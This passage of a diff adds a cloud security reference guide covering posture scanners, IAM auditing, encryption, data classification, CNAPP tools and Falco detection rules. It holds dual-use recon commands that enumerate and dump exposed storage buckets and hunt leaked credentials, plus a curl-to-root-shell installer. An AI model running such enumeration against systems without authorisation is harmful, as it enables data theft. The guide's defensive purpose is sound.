+# Azure scan
+python scout.py azure --cli                          # Use Azure CLI credentials
+python scout.py azure --tenant TENANT_ID --subscription-ids SUB1 SUB2
+
+# GCP scan
+python scout.py gcp --user-account                   # Uses gcloud credentials
+python scout.py gcp --service-account /path/to/key.json
+
+# Custom ruleset (exclude/modify rules)
+python scout.py aws --ruleset custom_ruleset.json
+
+# Report: open report/scoutsuite-report/scoutsuite_results.html
+```
+
+**ScoutSuite finding categories**: IAM, EC2/Compute, S3/Storage, RDS/Database, CloudTrail/Logging, CloudFront/CDN, Redshift, Lambda, SQS, SNS, ElastiCache, ECS, Route53, Config, Security Hub
+
+---
+
+### 6.2 Prowler v3+
+
+Open-source cloud security tool with 300+ checks per cloud.
+
+```bash
+# Install
+pip install prowler
+# OR: docker pull public.ecr.aws/prowler-cloud/prowler:latest
+
+# AWS scan
+prowler aws                                          # All checks
+prowler aws -c iam_root_access_key_enabled          # Specific check
+prowler aws -g cis_1.4_aws                          # CIS 1.4 benchmark group
+prowler aws --compliance cis_1.4_aws               # Compliance mode
+prowler aws -M csv json html                        # Multiple output formats
+prowler aws --output-directory ./results
+prowler aws --list-checks                           # List all available checks
+prowler aws --filter-region us-east-1 eu-west-1    # Specific regions only
+prowler aws -R role-arn                             # Cross-account via role
+
+# Azure scan
+prowler azure --sp-env-auth                         # SP from env vars
+prowler azure --browser-auth                        # Browser-based auth
+prowler azure --subscription-ids SUB1 SUB2
+prowler azure --compliance cis_2.0_azure
+
+# GCP scan
+prowler gcp --credentials-file /path/to/key.json
+prowler gcp --project-ids PROJECT1 PROJECT2
+prowler gcp --compliance cis_2.0_gcp
+
+# Compliance frameworks supported:
+# AWS: CIS 1.4/1.5/2.0, PCI DSS 3.2.1/4.0, HIPAA, NIST 800-53, SOC2, ISO27001, FedRAMP, ENS, GDPR
+# Azure: CIS 1.4/1.5/2.0, MITRE ATT&CK, ENS
+# GCP: CIS 1.2/1.3/2.0, MITRE ATT&CK
+
+# Output formats: CSV, JSON, JSON-OCSF, HTML
+# Integration: AWS Security Hub, S3, Slack, Jira
+```
+
+---
+
+### 6.3 CloudMapper
+
+Cloud asset and network visualization tool (primarily AWS).
+
+```bash
+git clone https://github.com/duo-labs/cloudmapper
+pip install -r requirements.txt
+
+# Collect data (uses AWS credentials)
+python cloudmapper.py collect --account ACCOUNT_NAME
+
+# Generate network graph
+python cloudmapper.py prepare --account ACCOUNT_NAME
+python cloudmapper.py webserver          # Opens http://localhost:8000
+
+# Generate report
+python cloudmapper.py report --account ACCOUNT_NAME
+
+# Audit findings
+python cloudmapper.py audit --account ACCOUNT_NAME --json
+```
+
+**CloudMapper analysis capabilities**:
+- Network exposure analysis (which EC2 instances are internet-accessible)
+- Security group analysis (overly permissive rules)
+- VPC peering relationships
+- IAM enumeration for network-relevant roles
+
+---
+
+### 6.4 Steampipe
+
+SQL-based querying of cloud APIs. Uses PostgreSQL FDW interface.
+
+```bash
+# Install
+brew install turbot/tap/steampipe  # macOS
+# Linux: sudo /bin/sh -c "$(curl -fsSL https://steampipe.io/install/steampipe.sh)"
+
+# Install plugins
+steampipe plugin install aws azure gcp github kubernetes
+
+# Start service
+steampipe service start
+
+# Run queries
+steampipe query
+
+# Example queries
+steampipe query "select name, public_access_block_enabled from aws_s3_bucket where public_access_block_enabled = false"
+steampipe query "select name, admin_enabled from azure_key_vault where admin_enabled = true"
+steampipe query "select name, member from gcp_project_iam_binding where role = 'roles/owner' and member like 'allUsers%'"
+
+# Run benchmarks (CIS, PCI, etc.)
+steampipe check benchmark.cis_v150  # AWS CIS 1.5.0
+steampipe check all --output html > report.html
+
+# Power query: join across clouds
+steampipe query "
+  select a.name as aws_bucket, g.name as gcp_bucket
+  from aws_s3_bucket a, gcp_storage_bucket g
+  where a.region = 'us-east-1' and g.location = 'US'
+"
+```
+
+---
+
+### 6.5 Cartography
+
+Neo4j-based graph tool for infrastructure attack path analysis.
+
+```bash
+pip install cartography
+
+# Configure Neo4j (requires running instance)
+# Run data collection
+cartography --neo4j-uri bolt://localhost:7687 \
+  --neo4j-user neo4j \
+  --neo4j-password password \
+  --aws-sync-all-profiles           # Sync all configured AWS profiles
+
+# Query attack paths in Neo4j
+# Find EC2 instances with admin IAM roles reachable from internet:
+MATCH (sg:EC2SecurityGroup)<-[:MEMBER_OF_EC2_SECURITY_GROUP]-(:NetworkInterface)
+      <-[:NETWORK_INTERFACE]-(ec2:EC2Instance)
+      -[:INSTANCE_PROFILE]->(:AWSInstanceProfile)
+      -[:ASSOCIATED_WITH]->(role:AWSRole)
+      -[:ASSUME_ROLE_POLICY_DOCUMENT]->(:AWSPolicyDocument)
+WHERE sg.ingress_rules CONTAINS '0.0.0.0/0'
+  AND role.name CONTAINS 'Admin'
+RETURN ec2.instanceid, role.name, sg.name
+```
+
+---
+
+### 6.6 Vulnerable Cloud Labs
+
+Intentionally vulnerable environments for security training.
+
+**CloudGoat** (Rhino Security Labs — AWS):
+```bash
+pip install cloudgoat
+cloudgoat config profile default
+cloudgoat create vulnerable_cognito    # Deploys vulnerable scenario
+cloudgoat list                          # List available scenarios
+# Scenarios: iam_privesc_by_rollback, cloud_breach_s3, ecs_efs_attack, rce_web_app, etc.
+cloudgoat destroy vulnerable_cognito
+```
+
+**TerraGoat** (Bridgecrew):
+- Terraform IaC with intentional misconfigurations for Checkov training
+- Covers AWS, Azure, GCP misconfigs
+
+**AzureGoat** (INE):
+- Intentionally vulnerable Azure environment
+- Misconfigurations in: Function Apps, Storage, RBAC, KeyVault, SQL
+
+**flaws.cloud / flaws2.cloud**: Free CTF-style AWS security challenges (S3 permissions, metadata service, etc.)
+
+**thunder CTF**: GCP security CTF challenges
+
+---
+
+### 6.7 Cloud Subdomain Enumeration & CNAPP
+
+**cloud_enum**: Multi-cloud asset discovery.
+```bash
+python cloud_enum.py -k company-name    # Enumerate AWS/Azure/GCP assets for keyword
+python cloud_enum.py -k target -l wordlist.txt -t 50  # Custom wordlist, 50 threads
+# Finds: S3 buckets, Azure blobs, Azure websites, GCP buckets, GCP Firebase, etc.
+```
+
+**S3Scanner**: S3 bucket security scanner.
+```bash
+pip install s3scanner
+s3scanner scan --bucket target-bucket-name
+s3scanner scan --bucket-file buckets.txt
+```
+
+**GCPBucketBrute**: GCP Cloud Storage bucket enumeration.
+
+**BlobHunter**: Azure Blob Storage exposure tool.
+
+**CNAPP Platforms** (commercial):
+
+| Platform | Key Differentiator |
+|---|---|
+| Wiz | Agentless, attack path analysis, toxic combinations (multi-factor risk) |
+| Orca Security | SideScanning (no agents), complete asset inventory |
+| Prisma Cloud (Palo Alto) | Broad coverage, CWPP+CSPM+CIEM+CNAPP |
+| Lacework | Anomaly detection, behavioral analysis |
+| Aqua Security | Container/serverless focus, supply chain |
+| Sysdig | Falco-based runtime, eBPF agent |
+| Tenable Cloud Security (Ermetic) | CIEM focus, net-effective permissions |
+| CrowdStrike Falcon Cloud | EDR + cloud workload combined |
+
+---
+
+### 6.8 Attack Surface Management
+
+**Attack Path** methodology:
+1. **Discovery**: Enumerate all cloud resources (accounts, subscriptions, projects)
+2. **Exposure**: Find internet-facing assets, public resources
+3. **Vulnerability**: Identify CVEs, misconfigurations
+4. **Identity**: Map IAM permissions, overprivileged identities
+5. **Lateral movement**: Find paths between resources
+6. **Crown jewels**: Identify sensitive data stores, admin capabilities
+
+**Toxic combinations** (Wiz concept): Individual issues that are low severity alone but critical in combination:
+- EC2 with: public IP + critical CVE + admin IAM role + IMDSv1 enabled
+- S3 bucket with: public access + sensitive data + no encryption
+- Lambda with: internet trigger + environment variable secrets + admin execution role
+
+---
+
+## 7. Cloud IAM Security & Least Privilege
+
+### 7.1 IAM Audit Methodology
+
+**Phase 1: Inventory**
+```bash
+# AWS: enumerate all IAM entities
+aws iam get-account-authorization-details --output json > iam-dump.json
+# Contains: users, roles, groups, policies, attachments
+
+# GCP: export org IAM policy
+gcloud projects get-iam-policy PROJECT_ID --format=json > gcp-iam.json
+gcloud organizations get-iam-policy ORG_ID --format=json
+
+# Azure: export all role assignments
+az role assignment list --all --output json > azure-rbac.json
+az ad app list --all --output json > azure-apps.json
+```
+
+**Phase 2: Analysis**
+- Identify principals with `*` action or `*` resource permissions
+- Find roles/users with direct AdministratorAccess equivalent
+- Identify unused access keys, unused roles (no last used date > 90 days)
+- Check for cross-account roles with trust policies open to `*` or external accounts
+- Identify service accounts/SPs with human-equivalent privileges
+- Review permission boundaries and SCPs for gaps
+
+**Phase 3: Least Privilege**
+- Right-size permissions to specific actions and resources
+- Remove wildcard actions; replace with specific service actions
+- Add resource ARN constraints (avoid `"Resource": "*"`)
+- Add condition keys (source IP, source VPC, MFA required, etc.)
+- Implement time-bound access for sensitive operations
+
+**IAM credential hygiene**:
+```bash
+# AWS: generate credential report
+aws iam generate-credential-report
+aws iam get-credential-report --query Content --output text | base64 -d | column -t -s,
+# Columns: user, arn, password_enabled, password_last_used, password_last_changed,
+#          access_key_1_active, access_key_1_last_used_date, etc.
+
+# Identify unused access keys (not used in 90 days)
+# Identify users with no MFA
+# Identify root account activity
+```
+
+---
+
+### 7.2 Service Account Key Rotation
+
+**AWS best practices**:
+```bash
+# List access keys
+aws iam list-access-keys --user-name myuser
+
+# Rotate: create new key first, update app, then deactivate old
+aws iam create-access-key --user-name myuser
+# → Update app with new key
+aws iam update-access-key --user-name myuser --access-key-id OLDKEY --status Inactive
+# → After confirming new key works:
+aws iam delete-access-key --user-name myuser --access-key-id OLDKEY
+
+# Automate via Lambda + EventBridge (90-day rotation)
+# Or use AWS Secrets Manager with rotation Lambda
+```
+
+**GCP SA key rotation**:
+```bash
+# Create new key
+gcloud iam service-accounts keys create new-key.json --iam-account sa@project.iam.gserviceaccount.com
+
+# List keys (track creation dates)
+gcloud iam service-accounts keys list --iam-account sa@project.iam.gserviceaccount.com
+
+# Delete old key
+gcloud iam service-accounts keys delete KEY_ID --iam-account sa@project.iam.gserviceaccount.com
+
+# Organization policy to restrict key age
+# Use SCC findings: "Service Account Key Not Rotated"
+```
+
+---
+
+### 7.3 GitHub Actions OIDC Federation (No Long-lived Keys)
+
+**AWS OIDC**:
+```yaml
+# GitHub Actions workflow
+permissions:
+  id-token: write    # Required for OIDC
+  contents: read
+
+steps:
+  - uses: aws-actions/configure-aws-credentials@v4
+    with:
+      role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
+      aws-region: us-east-1
+      role-session-name: GitHubActions-${{ github.run_id }}
+```
+
+```bash
+# AWS: Create OIDC provider
+aws iam create-open-id-connect-provider \
+  --url https://token.actions.githubusercontent.com \
+  --client-id-list sts.amazonaws.com \
+  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1
+
+# Trust policy for the role
+{
+  "Effect": "Allow",
+  "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
+  "Action": "sts:AssumeRoleWithWebIdentity",
+  "Condition": {
+    "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
+    "StringLike": {"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:*"}
+  }
+}
+```
+
+**GCP OIDC/WIF**: (See Section 5.1)
+
+**Azure OIDC**:
+```yaml
+- uses: azure/login@v2
+  with:
+    client-id: ${{ secrets.AZURE_CLIENT_ID }}
+    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+# No client secret required — uses federated identity credential
+```
+
+---
+
+### 7.4 ABAC (Attribute-Based Access Control)
+
+#### AWS — Tag-based Conditions
+
+```json
+{
+  "Effect": "Allow",
+  "Action": ["ec2:StartInstances", "ec2:StopInstances"],
+  "Resource": "*",
+  "Condition": {
+    "StringEquals": {
+      "ec2:ResourceTag/Environment": "${aws:PrincipalTag/Environment}",
+      "ec2:ResourceTag/Team": "${aws:PrincipalTag/Team}"
+    }
+  }
+}
+```
+Principal tags set during IdP→AWS federation via SAML/OIDC attribute mapping.
+
+#### GCP — IAM Conditions
+
+```bash
+gcloud projects add-iam-policy-binding my-project \
+  --member="serviceAccount:sa@project.iam.gserviceaccount.com" \
+  --role="roles/storage.objectViewer" \
+  --condition='title=TimeRestrictedAccess,expression=request.time.getHours("America/New_York") >= 9 && request.time.getHours("America/New_York") <= 17'
+```
+
+Supported condition attributes: `resource.name`, `resource.type`, `resource.service`, `request.time`, `request.auth.claims` (for WIF), geographic location.
+
+#### Azure — ABAC for Storage
+
+Azure ABAC (Preview → GA) adds conditions to role assignments based on blob index tags, container names, etc.
+```
+Condition: @Resource[Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags:Project<$key_case_insensitive$>] StringEquals 'Contoso'
+```
+
+---
+
+### 7.5 Just-in-Time Access Patterns
+
+| Pattern | Implementation |
+|---|---|
+| AWS SSO Permission Sets + IAM Identity Center | Users request elevated access via approval workflow; time-limited assignment |
+| PIM for Azure RBAC | Eligible assignment + activation with approval/MFA |
+| GCP PAM (Privileged Access Manager) | GA feature for JIT grants to GCP principals |
+| Custom Lambda + Slack Bot | Slack command → Lambda → AssumeRole for limited time, revoke on schedule |
+| Teleport | Open-source, supports AWS/GCP/Azure, SSH, Kubernetes — certificate-based JIT |
+| HashiCorp Boundary | Dynamic access broker for cloud resources |
+| CyberArk Alero / Delinea | Enterprise PAM with cloud integration |
+
+**GCP PAM**:
+```bash
+# Create grant (request JIT access)
+gcloud pam grants create \
+  --entitlement=ENTITLEMENT_ID \
+  --requested-duration=3600s \
+  --justification="Investigating production incident INC-1234" \
+  --location=global
+```
+
+---
+
+### 7.6 Automated IAM Policy Testing
+
+**parliament** (AWS IAM linting):
+```bash
+pip install parliament
+parliament --file policy.json
+# Checks: unknown actions, invalid ARNs, overly permissive, missing conditions
+```
+
+**iamlive** (generate least-privilege from actual usage):
+```bash
+# Run alongside AWS CLI — captures API calls and generates minimum policy
+iamlive --set-ini  # Configure AWS CLI proxy
+aws s3 ls         # Your AWS operations
+# iamlive outputs the minimum IAM policy for operations performed
+```
+
+**Policy Sentry** (IAM policy generator):
+```bash
+pip install policy_sentry
+policy_sentry write-policy --input-file actions.yml
+# Generate policy based on actions and resource ARNs
+```
+
+**AWS IAM Access Analyzer Policy Generation**:
+```bash
+# Generate policy from CloudTrail events
+aws accessanalyzer start-policy-generation \
+  --policy-generation-details '{"principalArn":"arn:aws:iam::123456789012:role/MyRole"}' \
+  --cloud-trail-details '{"trails":[{"cloudTrailArn":"arn:aws:cloudtrail:..."}],"startTime":"2024-01-01T00:00:00Z","endTime":"2024-06-01T00:00:00Z"}'
+aws accessanalyzer get-generated-policy --job-id JOB_ID
+```
+
+**tf-aws-iam-policy-document** / **Conftest** / **OPA**: Policy-as-code testing for IaC.
+
+---
+
+### 7.7 CIEM Tools
+
+**Cloud Infrastructure Entitlement Management** tools analyze net-effective permissions and identify excess entitlements.
+
+| Tool | Approach |
+|---|---|
+| Tenable Cloud Security (Ermetic) | Net-effective permissions graph; human + machine identities |
+| Authomize | Identity security platform; cross-cloud |
+| CrowdStrike Falcon CIEM | Integrated with EDR platform |
+| Wiz CIEM | Part of CNAPP; attack path + entitlement analysis |
+| Prisma Cloud CIEM | Permission queries, remediation playbooks |
+| AWS IAM Access Analyzer | Native AWS; external access + unused access |
+| Google Cloud IAM Recommender | Suggests least-privilege roles based on actual usage |
+| Azure Entra ID Access Reviews | Periodic review with auto-remediation |
+
+**GCP IAM Recommender**:
+```bash
+# Get recommendations for a principal
+gcloud recommender recommendations list \
+  --recommender=google.iam.policy.Recommender \
+  --location=global \
+  --project=my-project
+
+# Apply a recommendation
+gcloud recommender recommendations mark-claimed RECOMMENDATION_ID \
+  --project=my-project --location=global \
+  --recommender=google.iam.policy.Recommender
+```
+
+---
+
+## 8. Cloud Data Security
+
+### 8.1 Encryption at Rest
+
+#### AWS
+
+| Type | Key Management | Use Case |
+|---|---|---|
+| SSE-S3 (AES-256) | AWS-managed per-object keys | Default S3 encryption |
+| SSE-KMS | KMS CMK (aws/s3 or customer CMK) | Audit key usage, cross-account control |
+| SSE-C | Customer-supplied key per request | Customer controls all key material |
+| DSSE-KMS | Dual-layer SSE with two KMS keys | Highest assurance (regulatory compliance) |
+
+**Enforce encryption**:
+```json
+{
+  "Sid": "DenyUnencryptedUploads",
+  "Effect": "Deny",
+  "Principal": "*",
+  "Action": "s3:PutObject",
+  "Resource": "arn:aws:s3:::my-bucket/*",
+  "Condition": {
+    "StringNotEquals": {"s3:x-amz-server-side-encryption": "aws:kms"}
+  }
+}
+```
+
+**EBS encryption**: Enable by default (account-level default KMS key or custom CMK). `aws ec2 enable-ebs-encryption-by-default`
+
+**RDS encryption**: Must enable at creation. Encrypts storage, automated backups, read replicas, snapshots using KMS CMK.
+
+#### GCP
+
+| Type | Description |
+|---|---|
+| GMEK (Google-managed encryption key) | Default; Google manages keys |
+| CMEK (Customer-managed encryption key) | Cloud KMS key, customer controls rotation/deletion |
+| CSEK (Customer-supplied encryption key) | Customer provides key material per request; GCP never stores |
+
+**CMEK configuration** (GCS):
+```bash
+gcloud storage buckets create gs://my-bucket \
+  --default-kms-key projects/my-project/locations/global/keyRings/my-ring/cryptoKeys/my-key
+```
+
+#### Azure
+
+| Type | Description |
+|---|---|
+| PMK (Platform-managed key) | Microsoft manages keys |
+| CMK (Customer-managed key) | Key stored in Azure Key Vault |
+| Double encryption | Two layers of encryption (PMK + CMK or CMK + CMK) |
+
+**Enforce CMK for storage**:
+```bash
+az storage account update \
+  --name mystorageaccount \
+  --resource-group myRG \
+  --encryption-key-source Microsoft.Keyvault \
+  --encryption-key-vault https://myvault.vault.azure.net \
+  --encryption-key-name mykey \
+  --encryption-key-version KEY_VERSION
+```
+
+---
+
+### 8.2 Encryption in Transit
+
+**TLS enforcement patterns**:
+
+**AWS**: Bucket policy `aws:SecureTransport: false` → Deny. API Gateway: require TLS 1.2+. CloudFront: minimum TLS 1.2 policy. RDS: `rds.force_ssl=1` for PostgreSQL, `require_secure_transport=ON` for MySQL.
+
+**GCP**: Load balancers enforce HTTPS. Cloud SQL: `requireSsl: true`. `constraints/compute.requireSslCertificates` org policy.
+
+**Azure**: Storage: `supportsHttpsTrafficOnly: true`. SQL: `sslEnforcement: Enabled`. App Service: HTTPS Only setting. TLS minimum version configurable (require 1.2).
+
+---
+
+### 8.3 Data Classification
+
+**Amazon Macie**:
+- Managed data identifiers: SSN, credit card, driver's license, passport, ABA routing, AWS credentials, private keys, medical terms (200+ types)
+- Custom data identifiers: regex + maximum match distance + keywords + ignore words
+- Sensitivity score per S3 bucket (0-100)
+
+```bash
+# Create Macie classification job
+aws macie2 create-classification-job \
+  --job-type SCHEDULED \
+  --schedule-frequency WEEKLY \
+  --name "Weekly-PII-Scan" \
+  --s3-job-definition '{"bucketDefinitions":[{"accountId":"123456789012","buckets":["my-bucket"]}]}'
+```
+
+**GCP DLP API** (Sensitive Data Protection):
+- 150+ built-in infoTypes: PERSON_NAME, EMAIL_ADDRESS, PHONE_NUMBER, CREDIT_CARD_NUMBER, US_SOCIAL_SECURITY_NUMBER, IBAN_CODE, etc.
+- Custom infoTypes: word lists, regex, stored infoTypes
+- Actions: inspect (find), de-identify (redact/mask/tokenize/encrypt), risk analysis (statistical properties)
+
+```bash
+gcloud dlp jobs create content-inspect \
+  --location us-central1 \
+  --inspect-config '{"infoTypes":[{"name":"EMAIL_ADDRESS"},{"name":"CREDIT_CARD_NUMBER"}]}' \
+  --storage-config '{"cloudStorageOptions":{"fileSet":{"url":"gs://my-bucket/**"}}}'
+```
+
+**Microsoft Purview** (formerly AIP):
+- Sensitivity labels: Public, General, Confidential, Highly Confidential
+- Auto-labeling: content-based (detect CCN, SSN, etc.) or context-based
+- Data Loss Prevention (DLP) policies: prevent sharing of labeled content
+- Information barriers: prevent communication between groups
+
+---
+
+### 8.4 Database Security
+
+**AWS RDS IAM Authentication**:
+```bash
+# Generate auth token (valid 15 minutes)
+aws rds generate-db-auth-token \
+  --hostname mydb.cluster-xxxxx.us-east-1.rds.amazonaws.com \
+  --port 5432 \
+  --region us-east-1 \
+  --username iam_user
+
+# Connect using token as password
+PGPASSWORD=$(aws rds generate-db-auth-token ...) psql -h HOST -U iam_user mydb
+```
+
+**GCP Cloud SQL Auth Proxy**:
+```bash
+# Download and run proxy
+./cloud-sql-proxy my-project:us-central1:my-instance --port 5432 &
+# Connect to 127.0.0.1:5432 — proxy handles IAM auth and TLS
+# Auth: Cloud SQL Client role (cloudsql.instances.connect)
+```
+
+**Azure SQL**:
+- **TDE (Transparent Data Encryption)**: Encrypts database files at rest (enabled by default)
+- **Always Encrypted**: Column-level encryption — keys never leave client; SQL Server never sees plaintext
+- **Dynamic Data Masking**: Obfuscates sensitive data for non-privileged users (partial/full masking)
+- **Azure AD authentication**: MFA-capable, no passwords in connection strings
+- **Ledger tables**: Immutable, append-only tables with cryptographic verification
+
+---
+
+### 8.5 Object Storage Exposure Assessment
+
+**S3Scanner**:
+```bash
+pip install s3scanner
+s3scanner scan --bucket target-bucket       # Check single bucket
+s3scanner scan --bucket-file buckets.txt    # Check list
+s3scanner dump --bucket target-bucket       # List contents of accessible bucket
+```
+
+**GCPBucketBrute**:
+```bash
+python3 GCPBucketBrute.py -k companyname -s wordlist.txt -o output.txt
+# Tests permutations: companyname, company-name, companyname-backup, etc.
+```
+
+**BlobHunter** (Azure):
+```bash
+python BlobHunter.py -a STORAGE_ACCOUNT_NAME   # Hunt for exposed blobs
+```
+
+**TruffleHog / GitLeaks**: Scan repositories for secrets (AWS keys, GCP SA keys, Azure connection strings).
+
+**grep.app / GitHub code search**: Find exposed cloud credentials in public repos.
+
+---
+
+### 8.6 DSPM (Data Security Posture Management)
+
+DSPM platforms continuously discover and classify sensitive data across cloud environments.
+
+| Platform | Capabilities |
+|---|---|
+| Wiz DSPM | Integrated with CNAPP; agentless discovery, sensitive data + access path analysis |
+| Laminar | Data catalog, lineage tracking, risk scoring |
+| Dig Security | Data store discovery, classification, anomaly detection |
+| Cyera | Real-time data monitoring across IaaS/SaaS |
+| Securiti | Data intelligence, consent management, regulatory compliance |
+| BigID | ML-based classification, privacy risk, data rights management |
+
+**DSPM capabilities**:
+- Shadow data discovery (data stores not in official inventory)
+- Sensitive data classification (PII, PHI, PCI, IP)
+- Data access entitlements analysis (who can access sensitive data)
+- Data flow mapping and lineage
+- Regulatory compliance mapping (GDPR, HIPAA, CCPA, SOC 2)
+- Anomaly detection for unusual data access patterns
+- Remediation recommendations (encryption, access removal, retention policies)
+
+---
+
+## 9. Cloud Native Security (CNAPP)
+
+### 9.1 CSPM (Cloud Security Posture Management)
+
+CSPM continuously monitors cloud configurations against security best practices and compliance frameworks.
+
+#### Wiz
+
+**Architecture**: Agentless scanning via read-only API access + snapshot analysis.
+
+**Key capabilities**:
+- **Attack path analysis**: Visualizes multi-step attack paths to crown jewels (databases, secrets, admin accounts)
+- **Toxic combinations**: Identifies co-occurrence of multiple risk factors creating critical risk
+  - Example: "Internet-exposed VM with critical CVE + admin IAM role + IMDSv1 + connection to database with sensitive data"
+- **Security graph**: All resources + configurations + vulnerabilities + network exposure in a graph database
+- **Risk prioritization**: Context-aware scoring (exposure + identity + data sensitivity)
+- **Cloud Detection and Response (CDR)**: Real-time threat detection via cloud provider logs
+
+**Wiz query example** (WQL — Wiz Query Language):
+```
+FIND Cloud Resource
+WHERE Cloud Resource.type = 'VirtualMachine'
+  AND Cloud Resource.isInternetExposed = TRUE
+  AND Cloud Resource.hasAdminIAMRole = TRUE
+  AND Cloud Resource.criticalCVECount > 0
+```
+
+#### Orca Security
+
+**SideScanning**: Reads cloud provider storage snapshots out-of-band — no agents, no performance impact, no privilege escalation risk.
+
+**Coverage**: Vulnerabilities (CVEs), malware, misconfigurations, authentication risks, lateral movement paths, sensitive data, compliance.
+
+#### Prisma Cloud (Palo Alto Networks)
+
+**Modules**:
+- **Cloud Security Posture (CSPM)**: Configuration assessment
+- **Cloud Workload Protection (CWPP)**: Runtime protection for VMs, containers, serverless
+- **Cloud Network Security (CNS)**: Microsegmentation, network anomaly detection
+- **Cloud Infrastructure Entitlement Management (CIEM)**: IAM analysis
+- **Application Security (Supply Chain Security)**: IaC, SCA, SAST integration in CI/CD
+
+---
+
+### 9.2 CIEM (Cloud Infrastructure Entitlement Management)
+
+**Core problem**: In cloud environments, identities (human + machine) accumulate excessive permissions over time. CIEM identifies and remediates excess entitlements.
+
+**Key metrics**:
+- **Net-effective permissions**: What a principal can actually do, accounting for all policy types (identity, resource, SCPs, permission boundaries)
+- **Permission utilization**: What % of granted permissions are actually used
+- **Privilege score**: Normalized score of how privileged an identity is
+
+**Analysis dimensions**:
+- Human identities (users, federated identities)
+- Machine identities (service accounts, roles, managed identities, SPs)
+- Cross-cloud identities (federation chains)
+- Privileged identities (those with admin/owner capabilities)
+- Orphaned identities (accounts with no owner or recent usage)
+
+**Authomize**:
+```bash
+# Connect cloud providers via API
+# Ingest IAM policies, activity logs, resource configurations
+# Query: "Show all identities with s3:* permissions on production buckets"
+# Generate least-privilege recommendations
+# Track remediation progress
+```
+
+**Tenable Cloud Security (Ermetic)**:
+```bash
+# Net-effective permissions analysis
+# "Can user X actually delete production RDS?" → traces through all policies
+# Attack simulation: model blast radius of compromised identity
+# Automated remediation: generate restrictive replacement policies
+```
+
+---
+
+### 9.3 CWPP (Cloud Workload Protection Platform)
+
+**Runtime protection components**:
+- **Host-based**: EDR for cloud VMs (CrowdStrike, Defender for Servers)
+- **Container runtime**: eBPF-based syscall monitoring (Falco, Sysdig, Aqua)
+- **Serverless**: Function invocation monitoring, dependency scanning
+
+**Falco** (CNCF — open-source runtime security):
+```yaml
+# Falco rule example
+- rule: Unexpected outbound connection from container
+  desc: Detect outbound connections from containers to non-approved IPs
+  condition: >
+    outbound and container and not proc.name in (approved_processes)
+    and not fd.sip in (approved_ips)
+  output: >
+    Outbound connection from container (user=%user.name container=%container.name
+    image=%container.image.repository command=%proc.cmdline connection=%fd.name)
+  priority: WARNING
+  tags: [network, container]
+
+- rule: Privilege escalation via sudo
+  desc: Sudo used inside container
+  condition: container and proc.name = sudo
+  output: Sudo executed in container (user=%user.name command=%proc.cmdline container=%container.name)
+  priority: ERROR
+```
+
+```bash
+# Deploy Falco on Kubernetes
+helm install falco falcosecurity/falco \
+  --set falco.grpc.enabled=true \
+  --set falco.grpcOutput.enabled=true \
+  --set falcosidekick.enabled=true \
+  --set falcosidekick.config.slack.webhookurl=https://hooks.slack.com/...
+```
+
+---
+
+### 9.4 Agentless vs Agent-based Scanning
+
+| Dimension | Agentless | Agent-based |
+|---|---|---|
+| Deployment | API access only | Agent installed in each workload |
+| Coverage | VM snapshots, container images, configs | Running processes, memory, network traffic |
+| Performance impact | None on workload | CPU/memory overhead |
+| Data freshness | Periodic (snapshot-based) | Real-time |
+| Runtime visibility | Limited | Full syscall-level visibility |
+| Evasion resistance | Easier to evade (point-in-time) | Harder to evade (continuous monitoring) |
+| Scalability | Scales easily | Agent management overhead |
+| Ephemeral workloads | May miss short-lived containers | Captures if agent deployed in image |
+
+**Hybrid approach** (recommended): Agentless for broad coverage and discovery; agents for high-value workloads needing runtime protection.
+
+---
+
+### 9.5 Cloud Detection and Response (CDR)
+
+**CDR** is the extension of EDR/XDR concepts to cloud control plane and data plane activity.
+
+**Data sources**:
+- Cloud provider audit logs (CloudTrail, Azure Activity Log, GCP Audit Logs)
+- Resource logs (VPC Flow Logs, DNS logs, S3 access logs)
+- Application logs (API Gateway, WAF, CloudFront)
+- Identity logs (sign-in logs, PIM activation logs)
+- Threat intelligence (IP reputation, domain intel)
+
+**Detection categories** (MITRE ATT&CK for Cloud):
+
+| Tactic | Technique |
+|---|---|
+| Initial Access | Valid accounts, phishing for cloud credentials, trusted relationship |
+| Execution | Cloud admin command, serverless function invocation |
+| Persistence | Account manipulation, implant in cloud image, modify cloud compute infrastructure |
+| Privilege Escalation | Valid accounts, cloud admin roles |
+| Defense Evasion | Unused/unsupported cloud regions, disable cloud logs, modify cloud compute infrastructure |
+| Credential Access | Unsecured credentials in files/metadata, steal application tokens |
+| Discovery | Cloud infrastructure discovery, cloud storage enumeration, cloud service enumeration |
+| Lateral Movement | Use alternate auth material, internal spearphishing |
+| Exfiltration | Transfer to cloud account, exfiltration over web service |
+| Impact | Data destruction, account access removal, financial resource discovery |
+
+---
+
+### 9.6 CIS Benchmarks for Cloud
+
+**CIS AWS Foundations Benchmark** (current: v3.0):
+- Section 1: IAM (MFA, access keys, password policy, support role)
+- Section 2: Storage (S3 encryption, public access block, CloudTrail log encryption)
+- Section 3: Logging (CloudTrail multi-region, log validation, CloudWatch metrics/alarms)
+- Section 4: Monitoring (unauthorized API calls, console login without MFA, root usage, IAM changes, etc.)
+- Section 5: Networking (default SG blocks all, no VPC peering to 0.0.0.0/0)
+
+**CIS Azure Foundations Benchmark** (current: v2.0.0):
+- Section 1: IAM (MFA, no guest users, no custom subscriptions with admin, privileged roles review)
+- Section 2: Defender for Cloud (plans, email notifications, auto-provisioning)
+- Section 3: Storage (secure transfer, public access, encryption)
+- Section 4: Database (SQL auditing, TDE, threat detection)
+- Section 5: Logging and Monitoring (activity log alerts, diagnostic settings)
+- Section 6: Networking (RDP/SSH restricted, NSG flow logs, Bastion, Firewall)
+- Section 7: VM (endpoint protection, OS disk encryption)
+- Section 8: Key Vault (purge protection, soft delete, logging, key/secret/cert expiry)
+
+**CIS GCP Foundations Benchmark** (current: v3.0.0):
+- Section 1: IAM (service account keys, SA admin, SA account user, KMS separation)
+- Section 2: Logging (audit logs all services, log metric filters + alerts)
+- Section 3: Networking (default firewall, SSH/RDP from internet, no default network)
+- Section 4: VM (full API access, OS Login, serial ports, project-wide SSH keys)
